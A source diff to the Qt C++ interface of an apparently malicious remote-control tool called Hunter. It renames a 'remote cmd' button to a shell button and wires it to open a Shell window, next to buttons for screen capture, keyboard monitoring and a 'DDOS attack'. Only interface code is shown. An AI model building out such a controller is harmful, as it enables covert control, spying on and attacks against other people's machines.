@@ -28,7 +28,7 @@ Hunter::Hunter(QWidget *parent)
     ui->widgetBt->setFixedWidth(200);
     // 设置自适应大小
     ui->btFile->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
-    ui->btCmd->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
+    ui->btShell->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
     ui->btScreen->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
     ui->btProcess->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
     ui->btDDos->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
@@ -38,7 +38,7 @@ Hunter::Hunter(QWidget *parent)
     ui->btOffline->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
     // 按钮文字
     ui->btFile->setText("文件\n管理");
-    ui->btCmd->setText("远程\ncmd");
+    ui->btShell->setText("远程\ncmd");
     ui->btScreen->setText("屏幕\n截图");
     ui->btDDos->setText("DDOS\n攻击");
     ui->btProcess->setText("进程\n管理");
@@ -156,6 +156,11 @@ Hunter::Hunter(QWidget *parent)
             // 开始监控
             food->sendCmdKeybd(port);
         }
+    });
+
+    // 启动远程shell
+    connect(ui->btShell, &QPushButton::clicked, this, [=](){
+        Shell *sh = new Shell();
     });
 
 
